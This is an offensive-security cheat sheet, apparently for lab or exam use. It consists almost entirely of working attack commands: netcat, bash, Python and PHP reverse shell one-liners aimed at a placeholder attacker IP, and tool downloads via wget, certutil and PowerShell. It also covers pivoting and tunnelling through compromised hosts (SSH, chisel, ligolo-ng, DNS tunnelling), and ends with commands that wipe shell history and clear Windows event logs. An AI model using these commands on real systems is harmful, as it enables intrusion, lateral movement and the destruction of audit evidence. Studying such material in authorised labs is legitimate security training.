# Shells, File Transfer & Pivoting Cheat Sheet

## Netcat shells

```bash
nc -nvlp <PORT>                                       # listener
nc -nv <ATTACKER_IP> <PORT> -e /bin/bash               # reverse — Linux target
nc.exe -nv <ATTACKER_IP> <PORT> -e cmd.exe              # reverse — Windows target
nc -nvlp <PORT> -c /bin/bash                            # bind shell
```

## One-liners by interpreter

```bash
bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> <PORT> >/tmp/f
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
php -r '$sock=fsockopen("<ATTACKER_IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
perl -e 'exec "/bin/sh";'
```

## Upgrading to a full TTY

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z, then on your own terminal:
stty raw -echo && fg
export TERM=xterm SHELL=/bin/bash
stty rows <N> columns <N>          # match `stty -a` on your real terminal
reset
```

## File transfer

```bash
python3 -m http.server <PORT>                            # serve from attacker

# Pull down — Linux
wget http://<ATTACKER_IP>:<PORT>/<file>
curl -O http://<ATTACKER_IP>:<PORT>/<file>

# Pull down — Windows
certutil -urlcache -split -f "http://<ATTACKER_IP>/<file>" <file>
iwr -uri http://<ATTACKER_IP>/<file> -Outfile <file>
(New-Object Net.WebClient).DownloadFile('http://<ATTACKER_IP>/<file>','<output>')

# SMB serve (Windows -> Kali, or vice versa)
impacket-smbserver share . -smb2support
copy \\<KALI_IP>\share\file .

# Evil-WinRM
upload <local> <remote>
download <remote> <local>

# SCP
scp <USER>@<TARGET_IP>:<remote_path> .
```

## Pivoting

### SSH tunnels

```bash
# Dynamic (SOCKS) — turns SSH into a SOCKS proxy for proxychains
ssh -N -D 0.0.0.0:9050 <USER>@<PIVOT_IP>
# /etc/proxychains4.conf: socks5 <PIVOT_IP> 9050
proxychains nmap -sT --top-ports=20 -Pn <TARGET2_IP>

# Local port forward — reach a service on TARGET2 through the pivot
ssh -N -L 0.0.0.0:<LOCAL_PORT>:<TARGET2_IP>:<TARGET2_PORT> <USER>@<PIVOT_IP>

# Remote port forward — expose an attacker-side port on the pivot
ssh -N -R 127.0.0.1:<PORT>:<ATTACKER_TARGET_IP>:<ATTACKER_TARGET_PORT> <ATTACKER_USER>@<ATTACKER_IP>

# Remote dynamic forward
ssh -N -R <PORT> <ATTACKER_USER>@<ATTACKER_IP>
# then on attacker: proxychains against that port
```

### sshuttle (root on client + Python3 on server)

```bash
sshuttle -r <USER>@<PIVOT_IP>:<PORT> <SUBNET1>/24 <SUBNET2>/24
```

### Windows port forwarding

```powershell
# plink (SSH client for Windows)
plink.exe -ssh -l <user> -pw <PW> -R 127.0.0.1:<LOCAL_PORT>:127.0.0.1:<TARGET_PORT> <ATTACKER_IP>

# netsh portproxy (needs admin)
netsh interface portproxy add v4tov4 listenport=<PORT> listenaddress=<HOST_IP> connectport=<TARGET_PORT> connectaddress=<TARGET_IP>
netsh interface portproxy show all
netsh advfirewall firewall add rule name="pf" protocol=TCP dir=in localip=<HOST_IP> localport=<PORT> action=allow
netsh interface portproxy del v4tov4 listenport=<PORT> listenaddress=<HOST_IP>   # cleanup
```

### ligolo-ng

```bash
# Attacker
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert

# Agent (on compromised host)
./agent -connect <ATTACKER_IP>:11601 -ignore-cert

# In ligolo console
session ; ifconfig    # note the internal subnet
# Attacker
sudo ip route add <INTERNAL_SUBNET> dev ligolo
start                 # in ligolo console
```

### Chisel (HTTP tunnel — useful when only HTTP egress works)

```bash
# Attacker
chisel server --port <PORT> --reverse

# Target
/tmp/chisel client <ATTACKER_IP>:<PORT> R:socks

# Attacker — use the resulting SOCKS proxy
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' <USER>@<TARGET2_IP>
```

### DNS tunneling (last-resort egress)

```bash
# dnscat2 — attacker
dnscat2-server <YOUR_ZONE>
# target
./dnscat <YOUR_ZONE>
# server console: port-forward through the DNS channel
listen 127.0.0.1:<LOCAL_PORT> <TARGET2_IP>:<TARGET2_PORT>
```

### Metasploit autoroute

```bash
run autoroute -s <TARGET1_SUBNET>
background
use auxiliary/scanner/portscan/tcp
set RHOSTS <TARGET2_IP>

portfwd add -l <LOCAL_PORT> -p <TARGET2_PORT> -r <TARGET2_IP>
```

## Clearing tracks (lab/exam context only)

```bash
history -c ; cat /dev/null > ~/.bash_history     # Linux
clearev                                            # Windows (Meterpreter)
```
